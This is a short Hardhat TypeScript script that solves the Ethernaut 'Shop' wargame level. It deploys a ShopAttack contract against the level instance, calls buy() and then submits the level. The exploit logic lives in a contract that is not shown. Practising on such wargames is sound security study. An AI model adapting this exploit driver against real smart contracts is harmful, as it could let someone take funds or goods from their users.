import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Shop } from '../typechain-types/Shop'
import { ShopAttack } from '../typechain-types/ShopAttack'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Shop', levelAddress, signer)) as Shop
  const attackContract = (await loadOrDeployContract('ShopAttack', [targetContract.address], signer)) as ShopAttack

  const tx = await attackContract.buy({ gasLimit: 100000 })
  console.log(`tx hash ${tx.hash}`)
  await tx.wait()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
